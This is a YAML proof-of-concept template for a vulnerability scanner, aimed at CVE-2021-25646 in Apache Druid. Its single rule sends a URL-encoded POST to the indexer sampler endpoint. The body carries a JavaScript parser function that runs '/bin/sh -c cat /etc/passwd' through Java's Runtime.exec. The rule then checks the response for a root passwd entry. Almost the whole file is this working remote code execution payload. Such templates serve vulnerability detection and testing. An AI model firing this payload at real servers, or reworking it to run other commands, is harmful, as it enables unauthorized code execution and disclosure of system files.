name: poc-yaml-druid-cve-2021-25646
binding: b15f3ec5-98d3-4492-ad4d-835283a66f55
manual: true
detail:
    author: BestMountain
    links:
        - https://github.com/yaunsky/cve-2021-25646
    vulnerability:
        id: CT-148061
        level: high
transport: http
rules:
    r0:
        request:
            cache: false
            method: POST
            path: /druid/indexer/v1/sampler
            headers:
                Accept: application/json, text/plain, */*
                Content-Type: application/json
            body: '%7B%22type%22%3A%22index%22%2C%22spec%22%3A%7B%22ioConfig%22%3A%7B%22type%22%3A%22index%22%2C%22firehose%22%3A%7B%22type%22%3A%22local%22%2C%22baseDir%22%3A%22/etc%22%2C%22filter%22%3A%22passwd%22%7D%7D%2C%22dataSchema%22%3A%7B%22dataSource%22%3A%22odgjxrrrePz%22%2C%22parser%22%3A%7B%22parseSpec%22%3A%7B%22format%22%3A%22javascript%22%2C%22timestampSpec%22%3A%7B%7D%2C%22dimensionsSpec%22%3A%7B%7D%2C%22function%22%3A%22function%28%29%7Bvar%20hTVCCerYZ%20%3D%20new%20java.util.Scanner%28java.lang.Runtime.getRuntime%28%29.exec%28%5C%22/bin/sh%60@%7E-c%60@%7Ecat%20/etc/passwd%5C%22.split%28%5C%22%60@%7E%5C%22%29%29.getInputStream%28%29%29.useDelimiter%28%5C%22%5C%5CA%5C%22%29.next%28%29%3Breturn%20%7Btimestamp%3A%5C%224137368%5C%22%2COQtGXcxBVQVL%3A%20hTVCCerYZ%7D%7D%22%2C%22%22%3A%7B%22enabled%22%3A%22true%22%7D%7D%7D%7D%7D%2C%22samplerConfig%22%3A%7B%22numRows%22%3A10%7D%7D'
        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
expression: r0()
